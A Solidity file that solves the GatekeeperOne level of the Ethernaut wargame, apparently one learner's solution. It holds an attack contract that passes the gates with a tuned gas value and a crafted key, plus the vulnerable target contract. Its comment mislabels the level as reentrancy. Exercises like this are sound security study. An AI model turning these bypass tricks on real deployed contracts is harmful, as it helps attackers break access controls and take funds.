// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';


/*
 * Used to solve level 13 (reentrancy) in Ethernaut. 
 * So far this is my least favorite one because of all the hardcoding that I resorted to.
 * That being said, I'm happy that I did it since it forced me to really dive into Remix's
 * debugger to look through the ethereum OPCODEs. 
 * If you know the problem, you know that this contract will not work for you. The key must
 * be changed based on your address. I'm certain that it can be calculated beforehand, but
 * that would require the gas value to be recalculated. You could probably reliably calculate
 * gas remaining as well, but it's easier to just go into the debugger and figure it out.
*/
contract GatekeeperOneAttack {
  GatekeeperOne keeper = GatekeeperOne(0xA71a5Cb5fBc1eB300DFDbfC272A545c7983022D8);
  
  constructor() public {
    // In the assembly, the value returned is what's displayed after the GAS keyword
    keeper.enter{gas: 991365}(0x1000000000008313);
  }

  function test3(bytes8 _gateKey) external view returns(uint32 a, uint16 b, uint64 c , uint16 d, bool e, bool f, bool g) {
    a = uint32(uint64(_gateKey));
    b = uint16(uint64(_gateKey));
    c = uint64(_gateKey);
    d = uint16(0xF8dac7973f0F444E19bf671915187A0A92f18313);
    e = a == b;
    f = a != c;
    g = a == d;
  }
}

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "Gate One!");
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0, "Gate Two!");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}